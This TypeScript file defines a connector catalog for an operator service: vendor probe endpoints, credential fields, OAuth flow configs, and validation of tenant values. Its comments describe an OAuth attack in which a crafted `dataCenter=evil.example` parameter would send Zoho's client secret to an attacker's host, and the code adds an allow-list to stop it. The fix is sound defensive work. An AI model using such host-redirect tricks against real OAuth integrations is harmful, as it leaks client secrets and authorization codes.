/**
 * Worker-side connector catalog (plan section 4, D9; task B2). Extends the shared catalog core
 * (`src/shared/operator-connectors.ts`) with the detail only the Worker needs: the fields a connection
 * drawer collects, the header name for `api-key-header` kinds, a fixed MCP `endpoint` where one exists,
 * and the `probe` spec `operator/src/connectors/probe.ts` executes for "Test connection".
 *
 * Every REST `probe.url` below was checked against the vendor's own public API documentation (WebFetch,
 * cross-checked with a web search where a fetch was truncated or 404'd); the doc URL used for each is the
 * catalog core's `docsUrl` unless noted in a comment. Where no cheap, documented "who am I" style
 * endpoint could be found (Plane), `probe` is `null` and the route answers "No probe available for this
 * kind yet" rather than guessing one. `custom-mcp` and `custom-rest` have no vendor to verify against;
 * their probe targets whatever server the admin points them at.
 */
import { CONNECTOR_CATALOG_CORE, CONNECTOR_KINDS, type ConnectorCatalogCore, type ConnectorKind } from '../../../src/shared/operator-connectors'

export type ConnectorFieldType = 'text' | 'password' | 'url'

export interface ConnectorField {
  key: string
  label: string
  type: ConnectorFieldType
  placeholder?: string
  help?: string
  required: boolean
  /** Pre-filled value used when the admin leaves the field blank (e.g. a self-hosted server's default
   *  origin). Never used for the `credential` field. */
  default?: string
}

export interface RestProbeSpec {
  kind: 'rest'
  method: 'GET' | 'POST'
  /** `{token}` placeholders resolved against `{ credential, ...config }`. `{baseUrl}` is substituted
   *  verbatim (it is itself a URL); every other placeholder is percent-encoded. */
  url: string
  /** Static extra headers the vendor requires (e.g. Notion's `Notion-Version`). Never a place for a
   *  secret; the credential is attached by `probe.ts` from `entry.auth` / `headerName`. */
  headers?: Record<string, string>
  /** HTTP Basic credentials when `auth === 'basic'`. Templated against the same vars as `url`, but never
   *  percent-encoded (they are base64-encoded as a pair, not embedded in a URL). */
  basicAuth?: { username: string; password: string }
  /** Static JSON body (a GraphQL query, for the two GraphQL-transport kinds). */
  body?: unknown
  /** JSON body with `{token}` placeholders resolved the same way as `basicAuth` (raw, not URL-encoded) -
   *  for the one vendor (HubSpot) whose cheap verification call wants the credential in the body. */
  bodyTemplate?: Record<string, string>
  /** Exact success status. Omitted means "any 2xx" (used by `custom-rest`, which has no fixed API shape). */
  expectedStatus?: number
  /** After a 2xx with `expectedStatus` unset or matched, this dotted path in the JSON body must equal
   *  `equals` or the probe is still reported as a failure (Slack's `auth.test` always answers HTTP 200,
   *  success or not). */
  successCheck?: { path: string; equals: unknown }
  /** How to turn the JSON body into one summary sentence. `{value}` is the string/number found at `path`;
   *  when the path is missing, `probe.ts` falls back to "Reached {label}, status {status}." */
  summary?: { path: string; template: string }
}

export interface McpProbeSpec {
  kind: 'mcp'
}

export type ProbeSpec = RestProbeSpec | McpProbeSpec

/** The one `config` field a vendor needs to identify a specific org/workspace/data-centre (Atlassian
 *  cloud id, Zoho data centre, Salesforce My Domain, a Microsoft Entra tenant id). Its `key` can be
 *  referenced as a `{placeholder}` inside `OAuthConfig.authorizeUrl`/`tokenUrl`/`scopes`, the same
 *  templating `RestProbeSpec.url` already uses. Undefined when the vendor needs none (Google Drive). */
export interface OAuthTenantField {
  key: string
  label: string
  placeholder?: string
  help?: string
  /**
   * REQUIRED whenever `tenantFieldPosition(oauth)` says `'host'` for this field (enforced by
   * `catalog.test.ts`'s "every host-positioned tenant field has allowedValues" test, which walks the
   * whole catalog). Security incident, not a style rule: `catalog.ts` templates a tenant field straight
   * into a URL's authority component for a reason (Zoho's `dataCenter` picks which of its seven regional
   * hosts to hit), but with no constraint on the value, `GET /v1/admin/connectors/zoho/oauth/start?
   * dataCenter=evil.example` makes the Worker's own callback exchange the authorization code - and send
   * `OAUTH_ZOHO_CLIENT_SECRET` - to `evil.example`, not Zoho, over a link that only needs an
   * already-authenticated admin to click it (the route itself is `auth: 'admin'`; the attacker never
   * needs a session, only a click). `allowedValues` closes it by construction: `routes/connectors-oauth.
   * ts`'s `/oauth/start` rejects any value outside this exact list with 400 before minting any state.
   */
  allowedValues?: readonly string[]
}

/**
 * Per-kind OAuth 2.0 config (task: "generic OAuth 2.0 authorization-code flow"). `flow` decides which
 * grant `operator/src/connectors/oauth.ts` runs:
 *  - `auth-code`: the 3-legged browser flow `routes/connectors-oauth.ts` drives end to end
 *    (`GET .../oauth/start` -> vendor consent -> `GET .../oauth/callback`). `authorizeUrl` and `pkce`
 *    only ever apply to this flow.
 *  - `client-credentials`: the 2-legged, no-browser grant. There is no `authorizeUrl` and PKCE does not
 *    apply (RFC 6749 4.4 has no user, no redirect); the drawer collects the vendor tenant/org fields and
 *    the per-connection client secret exactly as any other static-credential kind (`fields`, not this
 *    config), and `oauth.ts`'s `refreshOAuthToken` re-runs the same grant to mint a fresh token rather
 *    than using a `refresh_token` (client-credentials never issues one).
 *
 * `clientIdEnv`/`clientSecretEnv` are always `OAUTH_<KIND>_CLIENT_ID` / `OAUTH_<KIND>_CLIENT_SECRET`
 * Worker secrets - the Operator's own single app registration with that vendor (the same shape the
 * existing `CF_OAUTH_CLIENT_ID`/`CF_OAUTH_CLIENT_SECRET` pair already uses for the Cloudflare connect
 * flow). For an `auth-code` kind this is the one OAuth client every consent screen and token exchange
 * uses. For a `client-credentials` kind, binding these two flips `oauthConfigured`/`availability` at the
 * catalog level (task item 5); today's per-connection drawer flow (already existing before this task,
 * now vault-encrypting the secret instead of storing it in plaintext `config_json` - see `fields` below)
 * is the actual way a specific tenant gets connected, since each Salesforce org / Azure AD tenant
 * typically has its own app registration rather than sharing the Operator's. Wiring a shared-app,
 * no-drawer connect flow for these five kinds is out of this task's scope (only `GET .../oauth/start` and
 * `GET .../oauth/callback`, both auth-code-only, were asked for) - see the report's open question.
 */
interface OAuthConfigBase {
  /** Templated against `config`; each entry may contain `{placeholder}`s (Dynamics 365's scope embeds
   *  the org's own Dataverse URL). Joined with a space for the request. */
  scopes: string[]
  tenantField?: OAuthTenantField
  clientIdEnv: string
  clientSecretEnv: string
}

/** The 3-legged browser flow `routes/connectors-oauth.ts` drives end to end (`GET .../oauth/start` ->
 *  vendor consent -> `GET .../oauth/callback`). `authorizeUrl` is required by the type, not just
 *  convention, so a kind cannot be marked `auth-code` without one - the earlier optional-field version of
 *  this type let that slip through unnoticed. */
export interface OAuthAuthCodeConfig extends OAuthConfigBase {
  flow: 'auth-code'
  /** Templated the same way `RestProbeSpec.url` is against `config` (percent-encoded, except `{baseUrl}`
   *  if ever used). */
  authorizeUrl: string
  tokenUrl: string
  /** Does the vendor support PKCE (RFC 7636)? Sent whenever true; `oauth.ts` never sends
   *  `code_challenge` for a kind where this is false, since an unexpected parameter is occasionally
   *  rejected outright by a stricter authorization server. */
  pkce: boolean
}

/** The 2-legged, no-browser grant. No `authorizeUrl` and no PKCE exist for this type at all (RFC 6749 4.4
 *  has no user, no redirect) - the drawer collects the vendor tenant/org fields and the per-connection
 *  client secret exactly as any other static-credential kind (`ConnectorCatalogEntry.fields`, not this
 *  config), and `oauth.ts`'s `refreshOAuthToken` re-runs the same grant to mint a fresh token rather than
 *  using a `refresh_token` (client-credentials never issues one). */
export interface OAuthClientCredentialsConfig extends OAuthConfigBase {
  flow: 'client-credentials'
  tokenUrl: string
}

/**
 * Per-kind OAuth 2.0 config (task: "generic OAuth 2.0 authorization-code flow").
 *
 * `clientIdEnv`/`clientSecretEnv` are always `OAUTH_<KIND>_CLIENT_ID` / `OAUTH_<KIND>_CLIENT_SECRET`
 * Worker secrets - the Operator's own single app registration with that vendor (the same shape the
 * existing `CF_OAUTH_CLIENT_ID`/`CF_OAUTH_CLIENT_SECRET` pair already uses for the Cloudflare connect
 * flow). For an `auth-code` kind this is the one OAuth client every consent screen and token exchange
 * uses. For a `client-credentials` kind, binding these two flips `oauthConfigured`/`availability` at the
 * catalog level (task item 5); today's per-connection drawer flow (already existing before this task,
 * now vault-encrypting the secret instead of storing it in plaintext `config_json` - see `fields` below)
 * is the actual way a specific tenant gets connected, since each Salesforce org / Azure AD tenant
 * typically has its own app registration rather than sharing the Operator's. Wiring a shared-app,
 * no-drawer connect flow for these five kinds is out of this task's scope (only `GET .../oauth/start` and
 * `GET .../oauth/callback`, both auth-code-only, were asked for) - see the report's open question.
 */
export type OAuthConfig = OAuthAuthCodeConfig | OAuthClientCredentialsConfig

/** Where `{key}` sits inside one URL template: `host` when it appears before the first single slash that
 *  follows the scheme - or, for a template with no literal scheme at all (Salesforce's `tokenUrl` is
 *  `'{instanceUrl}/services/oauth2/token'`; the admin-supplied value is expected to carry its own
 *  `https://`), before the first slash in the whole template, since the placeholder is then standing in
 *  for the entire origin. `path` otherwise. `none` when the placeholder is not in this template. */
function placeholderPosition(template: string, key: string): 'host' | 'path' | 'none' {
  const placeholder = `{${key}}`
  const idx = template.indexOf(placeholder)
  if (idx === -1) return 'none'
  const schemeMatch = /^https?:\/\//i.exec(template)
  const authorityStart = schemeMatch ? schemeMatch[0].length : 0
  const nextSlash = template.indexOf('/', authorityStart)
  const hostRegionEnd = nextSlash === -1 ? template.length : nextSlash
  return idx < hostRegionEnd ? 'host' : 'path'
}

/**
 * The most dangerous position `oauth.tenantField` occupies across every URL template it is substituted
 * into - `host` if it is host-positioned in *either* `authorizeUrl` or `tokenUrl`, else `path` if it
 * appears only in a path position, else `none`. Scoped to the templates this kind's own flow actually
 * uses (`authorizeUrl` does not exist on a `client-credentials` config at all, so only `tokenUrl` is
 * checked there) - see `catalog.test.ts` for the walk-the-whole-catalog test this feeds.
 */
export function tenantFieldPosition(oauth: OAuthConfig): 'host' | 'path' | 'none' {
  if (!oauth.tenantField) return 'none'
  const key = oauth.tenantField.key
  const templates = oauth.flow === 'auth-code' ? [oauth.authorizeUrl, oauth.tokenUrl] : [oauth.tokenUrl]
  let sawPath = false
  for (const template of templates) {
    const position = placeholderPosition(template, key)
    if (position === 'host') return 'host'
    if (position === 'path') sawPath = true
  }
  return sawPath ? 'path' : 'none'
}

const TENANT_PATH_SHAPE_RE = /^[A-Za-z0-9-]{1,255}$/

export interface TenantValueCheck {
  ok: boolean
  error?: string
}

/**
 * Validates a tenant value against this kind's declared constraint before it is ever templated into a
 * request: `allowedValues` for a host-positioned field (the CRITICAL fix - an unconstrained value there
 * redirects the token exchange, client secret included, to whatever host the caller names), or a
 * GUID-or-single-DNS-label shape for a path-only one (the Microsoft Entra tenant id: letters, digits,
 * hyphens only - no dots, no slashes, no percent signs, so it can never smuggle a second path segment or
 * a scheme change into the URL it is substituted into). A field with no declared position (`none`)
 * always passes - no current catalog entry has a `tenantField` that is not templated into a URL, but a
 * future one that only stored the value for display would have no reason to fail here either.
 */
export function validateTenantValue(oauth: OAuthConfig, value: string): TenantValueCheck {
  if (!oauth.tenantField) return { ok: true }
  const position = tenantFieldPosition(oauth)
  if (position === 'host') {
    const allowed = oauth.tenantField.allowedValues
    if (!allowed?.length) return { ok: false, error: 'this connector has no allowed value list configured' }
    return allowed.includes(value) ? { ok: true } : { ok: false, error: `must be one of: ${allowed.join(', ')}` }
  }
  if (position === 'path') {
    return TENANT_PATH_SHAPE_RE.test(value)
      ? { ok: true }
      : { ok: false, error: 'must be a tenant id: letters, digits, and hyphens only - no dots, slashes, or percent signs' }
  }
  return { ok: true }
}

export interface ConnectorCatalogEntry extends ConnectorCatalogCore {
  fields: ConnectorField[]
  /** Static header name for `api-key-header` kinds with one fixed header (e.g. GitLab's `PRIVATE-TOKEN`).
   *  `custom-mcp` / `custom-rest` instead read a `headerName` the admin supplies as a `config` field. */
  headerName?: string
  /** Fixed MCP endpoint for a hosted server (GitHub). `custom-mcp` has no fixed endpoint; it reads
   *  `config.baseUrl`. */
  endpoint?: string
  probe: ProbeSpec | null
  /** Present only for the six `oauth2-auth-code` / `oauth2-client-credentials` kinds. */
  oauth?: OAuthConfig
}

function entry(
  core: ConnectorKind,
  fields: ConnectorField[],
  rest: Partial<Pick<ConnectorCatalogEntry, 'headerName' | 'endpoint' | 'probe' | 'oauth'>>
): ConnectorCatalogEntry {
  return { ...CONNECTOR_CATALOG_CORE[core], fields, probe: null, ...rest }
}

const CREDENTIAL_FIELD = (label: string, opts: Partial<ConnectorField> = {}): ConnectorField => ({
  key: 'credential',
  label,
  type: 'password',
  required: true,
  ...opts
})

const CUSTOM_HEADER_NAME_FIELD: ConnectorField = {
  key: 'headerName',
  label: 'Custom header name',
  type: 'text',
  help: 'Leave blank to send the credential as Authorization: Bearer; set a header name to send it as a raw header value instead',
  required: false
}

export const CONNECTOR_CATALOG: Record<ConnectorKind, ConnectorCatalogEntry> = {
  hubspot: entry(
    'hubspot',
    [CREDENTIAL_FIELD('Private app access token', { placeholder: 'pat-na1-...', help: 'Settings > Integrations > Private Apps > your app > Access token' })],
    {
      // Verified at https://developers.hubspot.com/docs/api-reference/account-account-info-v3/guide:
      // GET /account-info/v3/details, bearer auth, 200, response includes portalId. The earlier
      // /oauth/v2/private-apps/get/access-token-info path is not documented there and was dropped.
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://api.hubapi.com/account-info/v3/details',
        expectedStatus: 200,
        summary: { path: 'portalId', template: 'Reached HubSpot account {value}' }
      }
    }
  ),
  salesforce: entry(
    'salesforce',
    [
      { key: 'instanceUrl', label: 'My Domain URL', type: 'url', placeholder: 'https://yourorg.my.salesforce.com', help: 'Setup > My Domain. login.salesforce.com/test.salesforce.com are not accepted by this flow.', required: true },
      { key: 'clientId', label: "Connected app consumer key", type: 'text', required: true },
      CREDENTIAL_FIELD('Connected app consumer secret', { help: 'Setup > App Manager > your Connected App > View > Consumer Secret. Vault-encrypted, never stored in plain config.' })
    ],
    {
      // Verified 2026-09-06 (Salesforce Help, "OAuth 2.0 Client Credentials Flow"): POST
      // {instanceUrl}/services/oauth2/token, grant_type=client_credentials, client_id + client_secret.
      // No user-facing consent screen exists for this grant (RFC 6749 4.4), so there is no authorizeUrl
      // and PKCE does not apply. Permissions come from the Connected App's policy-assigned "run as" user,
      // not a requested scope list; 'api' is the conventional minimum requested here.
      oauth: {
        flow: 'client-credentials',
        tokenUrl: '{instanceUrl}/services/oauth2/token',
        scopes: ['api'],
        tenantField: { key: 'instanceUrl', label: 'My Domain URL', placeholder: 'https://yourorg.my.salesforce.com' },
        clientIdEnv: 'OAUTH_SALESFORCE_CLIENT_ID',
        clientSecretEnv: 'OAUTH_SALESFORCE_CLIENT_SECRET'
      }
    }
  ),
  pipedrive: entry(
    'pipedrive',
    [
      { key: 'companyDomain', label: 'Company domain', type: 'text', placeholder: 'yourcompany', help: 'The yourcompany in yourcompany.pipedrive.com', required: true },
      CREDENTIAL_FIELD('API token', { help: 'Settings > Personal preferences > API' })
    ],
    {
      headerName: 'x-api-token',
      // Corrected from an earlier v1-style `?api_token=` query param: Pipedrive's current docs
      // (pipedrive.readme.io/docs/how-to-find-the-api-token, checked 2026-09-06) specify the token in
      // an `x-api-token` header against a company-specific `https://{domain}.pipedrive.com/api/v2/`
      // base, and do not document a lightweight parameter-free "who am I" endpoint for v2. Rather than
      // guess a v2 path, probe stays null - the route answers "No probe available for this kind yet."
      probe: null
    }
  ),
  zoho: entry(
    'zoho',
    [
      {
        key: 'dataCenter',
        label: 'Data centre',
        type: 'text',
        placeholder: 'accounts.zoho.com',
        help: 'accounts.zoho.com (US), accounts.zoho.eu, accounts.zoho.in, accounts.zoho.com.au, accounts.zoho.jp, accounts.zoho.com.cn, or accounts.zohocloud.ca - must match the data centre of the account that created the API console client',
        required: true
      }
    ],
    {
      // Verified 2026-09-06 at zoho.com/crm/developer/docs/api/v6/multi-dc.html (region domains) and
      // .../oauth-overview.html (the /oauth/v2/auth, /oauth/v2/token paths). A "Server-based
      // Applications" client (as opposed to a Self Client) supports the standard browser redirect this
      // Operator flow drives; PKCE is not documented as supported and is never sent.
      oauth: {
        flow: 'auth-code',
        authorizeUrl: 'https://{dataCenter}/oauth/v2/auth',
        tokenUrl: 'https://{dataCenter}/oauth/v2/token',
        scopes: ['ZohoCRM.modules.ALL', 'ZohoCRM.settings.ALL'],
        pkce: false,
        tenantField: {
          key: 'dataCenter',
          label: 'Data centre',
          placeholder: 'accounts.zoho.com',
          // CRITICAL fix: dataCenter is host-positioned in both authorizeUrl and tokenUrl above, so an
          // unconstrained value here would let /oauth/start's ?dataCenter= query param redirect the
          // token exchange - OAUTH_ZOHO_CLIENT_SECRET included - to an attacker's host. These seven are
          // Zoho's complete, documented set (zoho.com/crm/developer/docs/api/v6/multi-dc.html, checked
          // 2026-09-06); routes/connectors-oauth.ts rejects anything else with 400 before minting state.
          allowedValues: [
            'accounts.zoho.com',
            'accounts.zoho.eu',
            'accounts.zoho.in',
            'accounts.zoho.com.au',
            'accounts.zoho.jp',
            'accounts.zoho.com.cn',
            'accounts.zohocloud.ca'
          ]
        },
        clientIdEnv: 'OAUTH_ZOHO_CLIENT_ID',
        clientSecretEnv: 'OAUTH_ZOHO_CLIENT_SECRET'
      }
    }
  ),
  dynamics365: entry(
    'dynamics365',
    [
      { key: 'tenantId', label: 'Microsoft Entra tenant id', type: 'text', placeholder: '11111111-1111-1111-1111-111111111111', required: true },
      { key: 'instanceUrl', label: 'Organization URL', type: 'url', placeholder: 'https://yourorg.crm.dynamics.com', required: true },
      { key: 'clientId', label: 'Azure AD app client id', type: 'text', required: true },
      CREDENTIAL_FIELD('Client secret', { help: 'Azure AD app registration > Certificates & secrets. Vault-encrypted, never stored in plain config.' })
    ],
    {
      // Verified 2026-09-06 at learn.microsoft.com/entra/identity-platform/v2-oauth2-client-creds-grant-flow:
      // POST https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token, grant_type=client_credentials,
      // scope=<resource>/.default. The Dataverse resource is the org's own instance URL.
      oauth: {
        flow: 'client-credentials',
        tokenUrl: 'https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token',
        scopes: ['{instanceUrl}/.default'],
        tenantField: { key: 'tenantId', label: 'Microsoft Entra tenant id' },
        clientIdEnv: 'OAUTH_DYNAMICS365_CLIENT_ID',
        clientSecretEnv: 'OAUTH_DYNAMICS365_CLIENT_SECRET'
      }
    }
  ),
  attio: entry(
    'attio',
    [CREDENTIAL_FIELD('Access token', { help: 'Workspace settings > Developers > Access tokens' })],
    {
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://api.attio.com/v2/self',
        expectedStatus: 200,
        summary: { path: 'workspace_name', template: 'Reached Attio workspace {value}' }
      }
    }
  ),
  close: entry(
    'close',
    [CREDENTIAL_FIELD('API key', { help: 'Settings > Developer > API Keys' })],
    {
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://api.close.com/api/v1/me/',
        basicAuth: { username: '{credential}', password: '' },
        expectedStatus: 200,
        summary: { path: 'email', template: 'Reached Close as {value}' }
      }
    }
  ),
  clickup: entry(
    'clickup',
    [CREDENTIAL_FIELD('Personal API token', { placeholder: 'pk_...', help: 'Settings > Apps > API Token' })],
    {
      headerName: 'Authorization',
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://api.clickup.com/api/v2/user',
        expectedStatus: 200,
        summary: { path: 'user.username', template: 'Reached ClickUp as {value}' }
      }
    }
  ),
  jira: entry(
    'jira',
    [
      { key: 'email', label: 'Account email', type: 'text', required: true },
      { key: 'subdomain', label: 'Site', type: 'text', placeholder: 'yourcompany', help: 'The yourcompany in yourcompany.atlassian.net', required: true },
      CREDENTIAL_FIELD('API token', { help: 'id.atlassian.com/manage-profile/security/api-tokens' })
    ],
    {
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://{subdomain}.atlassian.net/rest/api/3/myself',
        basicAuth: { username: '{email}', password: '{credential}' },
        expectedStatus: 200,
        summary: { path: 'displayName', template: 'Reached Jira as {value}' }
      }
    }
  ),
  linear: entry(
    'linear',
    [CREDENTIAL_FIELD('Personal API key', { help: 'Settings > API > Personal API keys' })],
    {
      headerName: 'Authorization',
      probe: {
        kind: 'rest',
        method: 'POST',
        url: 'https://api.linear.app/graphql',
        body: { query: 'query Me { viewer { id name } }' },
        expectedStatus: 200,
        summary: { path: 'data.viewer.name', template: 'Reached Linear as {value}' }
      }
    }
  ),
  asana: entry(
    'asana',
    [CREDENTIAL_FIELD('Personal access token', { help: 'Settings > Apps > Manage Developer Apps > Create new token' })],
    {
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://app.asana.com/api/1.0/users/me',
        expectedStatus: 200,
        summary: { path: 'data.name', template: 'Reached Asana as {value}' }
      }
    }
  ),
  monday: entry(
    'monday',
    [CREDENTIAL_FIELD('API token', { help: 'Avatar > Developers > My Access Tokens' })],
    {
      headerName: 'Authorization',
      probe: {
        kind: 'rest',
        method: 'POST',
        url: 'https://api.monday.com/v2',
        body: { query: 'query { me { id name } }' },
        expectedStatus: 200,
        summary: { path: 'data.me.name', template: 'Reached monday.com as {value}' }
      }
    }
  ),
  trello: entry(
    'trello',
    [
      { key: 'key', label: 'API key', type: 'text', help: 'trello.com/app-key', required: true },
      CREDENTIAL_FIELD('Token', { help: "Trello's API requires the token in the request URL's query string, by vendor design; there is no header-based alternative." })
    ],
    {
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://api.trello.com/1/members/me?key={key}&token={credential}',
        expectedStatus: 200,
        summary: { path: 'fullName', template: 'Reached Trello as {value}' }
      }
    }
  ),
  plane: entry(
    'plane',
    [
      CREDENTIAL_FIELD('API key', { help: 'Workspace settings > API tokens' }),
      { key: 'workspace', label: 'Workspace slug', type: 'text', required: true },
      {
        key: 'baseUrl',
        label: 'Server URL',
        type: 'url',
        placeholder: 'https://api.plane.so',
        help: 'Self-hosted Plane instance URL, leave blank for Plane Cloud',
        required: false,
        default: 'https://api.plane.so'
      }
    ],
    {
      headerName: 'X-API-Key',
      // No lightweight, documented "current user" or "list workspaces" endpoint was found (Plane's
      // public API requires a workspace slug on every resource endpoint). Never guessed; probe stays null.
      probe: null
    }
  ),
  notion: entry(
    'notion',
    [CREDENTIAL_FIELD('Internal integration secret', { help: 'Notion integration settings > Secrets' })],
    {
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://api.notion.com/v1/users/me',
        // 2026-03-11 is Notion's current documented latest version (developers.notion.com/reference/versioning,
        // checked 2026-09-06); 2022-06-28 is explicitly called out there as no longer supported.
        headers: { 'Notion-Version': '2026-03-11' },
        expectedStatus: 200,
        summary: { path: 'name', template: 'Reached Notion as integration {value}' }
      }
    }
  ),
  airtable: entry(
    'airtable',
    [CREDENTIAL_FIELD('Personal access token', { help: 'airtable.com/create/tokens' })],
    {
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://api.airtable.com/v0/meta/whoami',
        expectedStatus: 200,
        summary: { path: 'id', template: 'Reached Airtable, token owner {value}' }
      }
    }
  ),
  zendesk: entry(
    'zendesk',
    [
      { key: 'email', label: 'Agent email', type: 'text', required: true },
      { key: 'subdomain', label: 'Subdomain', type: 'text', placeholder: 'yourcompany', required: true },
      CREDENTIAL_FIELD('API token', { help: 'Admin Center > Apps and integrations > APIs > Zendesk API' })
    ],
    {
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://{subdomain}.zendesk.com/api/v2/users/me.json',
        basicAuth: { username: '{email}/token', password: '{credential}' },
        expectedStatus: 200,
        summary: { path: 'user.name', template: 'Reached Zendesk as {value}' }
      }
    }
  ),
  intercom: entry(
    'intercom',
    [CREDENTIAL_FIELD('Access token', { help: 'Settings > Developers > Your apps > your app > Access token' })],
    {
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://api.intercom.io/me',
        expectedStatus: 200,
        summary: { path: 'name', template: 'Reached Intercom as {value}' }
      }
    }
  ),
  freshdesk: entry(
    'freshdesk',
    [
      { key: 'domain', label: 'Domain', type: 'text', placeholder: 'yourcompany', required: true },
      CREDENTIAL_FIELD('API key', { help: 'Profile settings > API Key' })
    ],
    {
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://{domain}.freshdesk.com/api/v2/agents/me',
        basicAuth: { username: '{credential}', password: 'X' },
        expectedStatus: 200,
        summary: { path: 'contact.name', template: 'Reached Freshdesk as {value}' }
      }
    }
  ),
  confluence: entry(
    'confluence',
    [
      { key: 'email', label: 'Account email', type: 'text', required: true },
      { key: 'subdomain', label: 'Site', type: 'text', placeholder: 'yourcompany', required: true },
      CREDENTIAL_FIELD('API token')
    ],
    {
      probe: {
        kind: 'rest',
        method: 'GET',
        url: 'https://{subdomain}.atlassian.net/wiki/rest/api/user/current',
        basicAuth: { username: '{email}', password: '{credential}' },
        expectedStatus: 200,
        summary: { path: 'displayName', template: 'Reached Confluence as {value}' }
      }
    }
  ),
  sharepoint: entry(
    'sharepoint',
    [
      { key: 'tenantId', label: 'Microsoft Entra tenant id', type: 'text', placeholder: '11111111-1111-1111-1111-111111111111', required: true },
      { key: 'clientId', label: 'Azure AD app client id', type: 'text', required: true },
      CREDENTIAL_FIELD('Client secret', { help: 'Azure AD app registration > Certificates & secrets. Vault-encrypted, never stored in plain config.' })
    ],
    {
      // Verified 2026-09-06 (same Microsoft identity platform client-credentials flow as Dynamics 365
      // and Teams below). SharePoint access is via Microsoft Graph (the modern, documented app-only
      // surface for site/drive access) rather than the legacy ACS-based SharePoint app-only model, which
      // Microsoft has been retiring - not independently re-verified against a SharePoint-specific page
      // this session, flagged in the report.
      oauth: {
        flow: 'client-credentials',
        tokenUrl: 'https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token',
        scopes: ['https://graph.microsoft.com/.default'],
        tenantField: { key: 'tenantId', label: 'Microsoft Entra tenant id' },
        clientIdEnv: 'OAUTH_SHAREPOINT_CLIENT_ID',
        clientSecretEnv: 'OAUTH_SHAREPOINT_CLIENT_SECRET'
      }
    }
  ),
  googledrive: entry(
    'googledrive',
    [],
    {
      // Verified 2026-09-06 at developers.google.com/identity/protocols/oauth2/web-server: authorize
      // https://accounts.google.com/o/oauth2/v2/auth, token https://oauth2.googleapis.com/token. PKCE is
      // supported broadly across Google's OAuth endpoints (RFC 7636 is additive - an authorization server
      // that does not require it simply ignores the parameter) though not called out specifically on this
      // page for a confidential server-side client; sent as defence in depth. drive.file scopes only the
      // files Métis itself creates/opens, matching least-privilege - broaden to drive.readonly or drive
      // only if Tony needs the fleet to read files it did not create.
      oauth: {
        flow: 'auth-code',
        authorizeUrl: 'https://accounts.google.com/o/oauth2/v2/auth',
        tokenUrl: 'https://oauth2.googleapis.com/token',
        scopes: ['https://www.googleapis.com/auth/drive.file'],
        pkce: true,
        clientIdEnv: 'OAUTH_GOOGLEDRIVE_CLIENT_ID',
        clientSecretEnv: 'OAUTH_GOOGLEDRIVE_CLIENT_SECRET'
      }
    }
  ),
  github: entry(
    'github',
    [CREDENTIAL_FIELD('Personal access token', { help: 'A fine-grained PAT with the scopes the tools you need require' })],
    {
      // Verified: github.com/github/github-mcp-server documents the hosted remote server at this URL,
      // Streamable HTTP, PAT as a Bearer token.
      endpoint: 'https://api.githubcopilot.com/mcp/',
      probe: { kind: 'mcp' }
    }
  ),
  gitlab: entry(
    'gitlab',
    [
      CREDENTIAL_FIELD('Personal access token', { help: 'User Settings > Access Tokens' }),
      {
        key: 'baseUrl',
        label: 'Server URL',
        type: 'url',
        placeholder: 'https://gitlab.com',
        help: 'Leave as-is for gitlab.com, or enter a self-hosted GitLab URL',
        required: false,
        default: 'https://gitlab.com'
      }
    ],
    {
      headerName: 'PRIVATE-TOKEN',
      probe: {
        kind: 'rest',
        method: 'GET',
        url: '{baseUrl}/api/v4/user',
        expectedStatus: 200,
        summary: { path: 'username', template: 'Reached GitLab as {value}' }
      }
    }
  ),
  slack: entry(
    'slack',
    [CREDENTIAL_FIELD('Bot token', { placeholder: 'xoxb-...', help: 'OAuth & Permissions > Bot User OAuth Token' })],
    {
      probe: {
        kind: 'rest',
        method: 'POST',
        url: 'https://slack.com/api/auth.test',
        expectedStatus: 200,
        successCheck: { path: 'ok', equals: true },
        summary: { path: 'team', template: 'Reached Slack workspace {value}' }
      }
    }
  ),
  microsoftteams: entry(
    'microsoftteams',
    [
      { key: 'tenantId', label: 'Microsoft Entra tenant id', type: 'text', placeholder: '11111111-1111-1111-1111-111111111111', required: true },
      { key: 'clientId', label: 'Azure AD app client id', type: 'text', required: true },
      CREDENTIAL_FIELD('Client secret', { help: 'Azure AD app registration > Certificates & secrets. Vault-encrypted, never stored in plain config.' })
    ],
    {
      // Verified 2026-09-06 (same Microsoft identity platform client-credentials flow as Dynamics 365 and
      // SharePoint above). Teams data (chats, channel messages) is exposed only through Microsoft Graph
      // app permissions, granted by a tenant admin, consumed with the standard `.default` scope.
      oauth: {
        flow: 'client-credentials',
        tokenUrl: 'https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token',
        scopes: ['https://graph.microsoft.com/.default'],
        tenantField: { key: 'tenantId', label: 'Microsoft Entra tenant id' },
        clientIdEnv: 'OAUTH_MICROSOFTTEAMS_CLIENT_ID',
        clientSecretEnv: 'OAUTH_MICROSOFTTEAMS_CLIENT_SECRET'
      }
    }
  ),
  'custom-mcp': entry(
    'custom-mcp',
    [
      { key: 'baseUrl', label: 'Server URL', type: 'url', required: true },
      CREDENTIAL_FIELD('Bearer token', { required: false, help: 'Leave blank if the server needs no authentication' }),
      CUSTOM_HEADER_NAME_FIELD
    ],
    { probe: { kind: 'mcp' } }
  ),
  'custom-rest': entry(
    'custom-rest',
    [
      { key: 'baseUrl', label: 'Server URL', type: 'url', required: true },
      CREDENTIAL_FIELD('Bearer token', { required: false }),
      CUSTOM_HEADER_NAME_FIELD
    ],
    {
      probe: {
        kind: 'rest',
        method: 'GET',
        url: '{baseUrl}'
      }
    }
  )
}

export function getConnectorCatalogEntry(kind: string): ConnectorCatalogEntry | null {
  return Object.prototype.hasOwnProperty.call(CONNECTOR_CATALOG, kind) ? CONNECTOR_CATALOG[kind as ConnectorKind] : null
}

